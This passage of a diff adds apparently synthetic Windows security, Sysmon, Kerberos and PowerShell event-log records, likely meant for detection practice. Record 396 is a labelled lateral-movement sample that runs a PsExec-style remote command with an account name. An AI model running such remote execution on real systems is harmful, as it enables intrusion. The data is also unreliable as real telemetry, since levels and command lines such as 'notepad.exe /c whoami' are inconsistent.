+    "event_id": 7,
+    "level": "Error",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 414,
+    "timestamp": "2025-08-18T06:53:00Z",
+    "host": "WEB01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Error",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 413,
+    "timestamp": "2025-08-18T06:52:00Z",
+    "host": "WS02",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Error",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 412,
+    "timestamp": "2025-08-18T06:51:00Z",
+    "host": "WS02",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 411,
+    "timestamp": "2025-08-18T06:50:00Z",
+    "host": "WS01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 410,
+    "timestamp": "2025-08-18T06:49:00Z",
+    "host": "SQL01",
+    "user": "Administrator",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 409,
+    "timestamp": "2025-08-18T06:48:00Z",
+    "host": "DC01",
+    "user": "msmith",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 408,
+    "timestamp": "2025-08-18T06:47:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 407,
+    "timestamp": "2025-08-18T06:46:00Z",
+    "host": "DC01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Error",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 406,
+    "timestamp": "2025-08-18T06:45:00Z",
+    "host": "DC01",
+    "user": "jdoe",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 405,
+    "timestamp": "2025-08-18T06:44:00Z",
+    "host": "SQL01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 404,
+    "timestamp": "2025-08-18T06:43:00Z",
+    "host": "SQL01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Error",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 403,
+    "timestamp": "2025-08-18T06:42:00Z",
+    "host": "WEB01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Warning",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 402,
+    "timestamp": "2025-08-18T06:41:00Z",
+    "host": "SQL01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 401,
+    "timestamp": "2025-08-18T06:40:00Z",
+    "host": "WS01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Warning",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 400,
+    "timestamp": "2025-08-18T06:39:00Z",
+    "host": "WS01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 399,
+    "timestamp": "2025-08-18T06:38:00Z",
+    "host": "FILE01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 398,
+    "timestamp": "2025-08-18T06:37:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Warning",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 397,
+    "timestamp": "2025-08-18T06:36:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Warning",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 396,
+    "timestamp": "2025-08-18T06:35:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\psexecsvc.exe",
+    "command_line": "psexec.exe \\\\WS02 -u CORP\\svc_backup -p ******** cmd /c whoami",
+    "attack_category": "Lateral Movement (PsExec-like)",
+    "attack_technique": "T1570",
+    "message": "A new process was created remotely via service control (PsExec-like behavior).",
+    "tags": [
+      "attack",
+      "lateral-movement"
+    ]
+  },
+  {
+    "id": 395,
+    "timestamp": "2025-08-18T06:34:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "command_line": "C:\\Program Files\\7-Zip\\7z.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 394,
+    "timestamp": "2025-08-18T06:33:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 393,
+    "timestamp": "2025-08-18T06:32:00Z",
+    "host": "WS02",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Error",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 392,
+    "timestamp": "2025-08-18T06:31:00Z",
+    "host": "WS01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 391,
+    "timestamp": "2025-08-18T06:30:00Z",
+    "host": "DC01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 390,
+    "timestamp": "2025-08-18T06:29:00Z",
+    "host": "WS02",
+    "user": "msmith",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 389,
+    "timestamp": "2025-08-18T06:28:00Z",
+    "host": "WEB01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 388,
+    "timestamp": "2025-08-18T06:27:00Z",
+    "host": "FILE01",
+    "user": "msmith",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 387,
+    "timestamp": "2025-08-18T06:26:00Z",
+    "host": "DC01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Error",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 386,
+    "timestamp": "2025-08-18T06:25:00Z",
+    "host": "SQL01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Warning",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 385,
+    "timestamp": "2025-08-18T06:24:00Z",
+    "host": "SQL01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 384,
+    "timestamp": "2025-08-18T06:23:00Z",
+    "host": "WS01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\svchost.exe",
+    "command_line": "C:\\Windows\\System32\\svchost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 383,
+    "timestamp": "2025-08-18T06:22:00Z",
+    "host": "WS02",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 382,
+    "timestamp": "2025-08-18T06:21:00Z",
+    "host": "DC01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 381,
+    "timestamp": "2025-08-18T06:20:00Z",
+    "host": "WS02",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 380,
+    "timestamp": "2025-08-18T06:19:00Z",
+    "host": "WS02",
+    "user": "svc_backup",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 379,
+    "timestamp": "2025-08-18T06:18:00Z",
+    "host": "WEB01",
+    "user": "svc_sql",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 378,
+    "timestamp": "2025-08-18T06:17:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\cmd.exe",
+    "command_line": "C:\\Windows\\System32\\cmd.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 377,
+    "timestamp": "2025-08-18T06:16:00Z",
+    "host": "WEB01",
+    "user": "Administrator",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 376,
+    "timestamp": "2025-08-18T06:15:00Z",
+    "host": "WEB01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 375,
+    "timestamp": "2025-08-18T06:14:00Z",
+    "host": "SQL01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 374,
+    "timestamp": "2025-08-18T06:13:00Z",
+    "host": "SQL01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 373,
+    "timestamp": "2025-08-18T06:12:00Z",
+    "host": "WS02",
+    "user": "Administrator",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 372,
+    "timestamp": "2025-08-18T06:11:00Z",
+    "host": "SQL01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\notepad.exe",
+    "command_line": "C:\\Windows\\System32\\notepad.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 371,
+    "timestamp": "2025-08-18T06:10:00Z",
+    "host": "WEB01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 370,
+    "timestamp": "2025-08-18T06:09:00Z",
+    "host": "WS01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\conhost.exe",
+    "command_line": "C:\\Windows\\System32\\conhost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 369,
+    "timestamp": "2025-08-18T06:08:00Z",
+    "host": "SQL01",
+    "user": "msmith",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 368,
+    "timestamp": "2025-08-18T06:07:00Z",
+    "host": "WS02",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 367,
+    "timestamp": "2025-08-18T06:06:00Z",
+    "host": "WEB01",
+    "user": "Administrator",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 366,
+    "timestamp": "2025-08-18T06:05:00Z",
+    "host": "WEB01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\wscript.exe",
+    "command_line": "C:\\Windows\\System32\\wscript.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 365,
+    "timestamp": "2025-08-18T06:04:00Z",
+    "host": "SQL01",
+    "user": "svc_backup",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 364,
+    "timestamp": "2025-08-18T06:03:00Z",
+    "host": "WS02",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 363,
+    "timestamp": "2025-08-18T06:02:00Z",
+    "host": "DC01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Error",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 362,
+    "timestamp": "2025-08-18T06:01:00Z",
+    "host": "DC01",
+    "user": "Administrator",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 361,
+    "timestamp": "2025-08-18T06:00:00Z",
+    "host": "WS01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\msiexec.exe",
+    "command_line": "C:\\Windows\\System32\\msiexec.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 360,
+    "timestamp": "2025-08-18T05:59:00Z",
+    "host": "SQL01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 359,
+    "timestamp": "2025-08-18T05:58:00Z",
+    "host": "DC01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\notepad.exe",
+    "command_line": "C:\\Windows\\System32\\notepad.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 358,
+    "timestamp": "2025-08-18T05:57:00Z",
+    "host": "WS01",
+    "user": "guest",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 357,
+    "timestamp": "2025-08-18T05:56:00Z",
+    "host": "DC01",
+    "user": "jdoe",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 356,
+    "timestamp": "2025-08-18T05:55:00Z",
+    "host": "DC01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Error",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 355,
+    "timestamp": "2025-08-18T05:54:00Z",
+    "host": "WEB01",
+    "user": "jdoe",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 354,
+    "timestamp": "2025-08-18T05:53:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 353,
+    "timestamp": "2025-08-18T05:52:00Z",
+    "host": "WEB01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 352,
+    "timestamp": "2025-08-18T05:51:00Z",
+    "host": "SQL01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Warning",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 351,
+    "timestamp": "2025-08-18T05:50:00Z",
+    "host": "WS02",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 350,
+    "timestamp": "2025-08-18T05:49:00Z",
+    "host": "WEB01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 349,
+    "timestamp": "2025-08-18T05:48:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 348,
+    "timestamp": "2025-08-18T05:47:00Z",
+    "host": "WEB01",
+    "user": "guest",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 347,
+    "timestamp": "2025-08-18T05:46:00Z",
+    "host": "DC01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 346,
+    "timestamp": "2025-08-18T05:45:00Z",
+    "host": "WEB01",
+    "user": "msmith",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 345,
+    "timestamp": "2025-08-18T05:44:00Z",
+    "host": "WS02",
+    "user": "msmith",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\rundll32.exe",
+    "command_line": "C:\\Windows\\System32\\rundll32.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 344,
+    "timestamp": "2025-08-18T05:43:00Z",
+    "host": "SQL01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Error",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 343,
+    "timestamp": "2025-08-18T05:42:00Z",
+    "host": "DC01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\notepad.exe",
+    "command_line": "C:\\Windows\\System32\\notepad.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 342,
+    "timestamp": "2025-08-18T05:41:00Z",
+    "host": "FILE01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\svchost.exe",
+    "command_line": "C:\\Windows\\System32\\svchost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 341,
+    "timestamp": "2025-08-18T05:40:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 340,
+    "timestamp": "2025-08-18T05:39:00Z",
+    "host": "DC01",
+    "user": "msmith",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\msiexec.exe",
+    "command_line": "C:\\Windows\\System32\\msiexec.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 339,
+    "timestamp": "2025-08-18T05:38:00Z",
+    "host": "WEB01",
+    "user": "svc_sql",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 338,
+    "timestamp": "2025-08-18T05:37:00Z",
+    "host": "WEB01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\wscript.exe",
+    "command_line": "C:\\Windows\\System32\\wscript.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 337,
+    "timestamp": "2025-08-18T05:36:00Z",
+    "host": "WEB01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Error",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 336,
+    "timestamp": "2025-08-18T05:35:00Z",
+    "host": "WEB01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Warning",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 335,
+    "timestamp": "2025-08-18T05:34:00Z",
+    "host": "SQL01",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\cmd.exe",
+    "command_line": "C:\\Windows\\System32\\cmd.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 334,
+    "timestamp": "2025-08-18T05:33:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Warning",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 333,
+    "timestamp": "2025-08-18T05:32:00Z",
+    "host": "WS01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "command_line": "C:\\Program Files\\7-Zip\\7z.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 332,
+    "timestamp": "2025-08-18T05:31:00Z",
+    "host": "WS01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Warning",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 331,
+    "timestamp": "2025-08-18T05:30:00Z",
+    "host": "DC01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 330,
+    "timestamp": "2025-08-18T05:29:00Z",
+    "host": "WS01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 329,
+    "timestamp": "2025-08-18T05:28:00Z",
+    "host": "WEB01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Error",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 328,
+    "timestamp": "2025-08-18T05:27:00Z",
+    "host": "FILE01",
+    "user": "svc_sql",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 327,
+    "timestamp": "2025-08-18T05:26:00Z",
+    "host": "FILE01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\cmd.exe",
+    "command_line": "C:\\Windows\\System32\\cmd.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
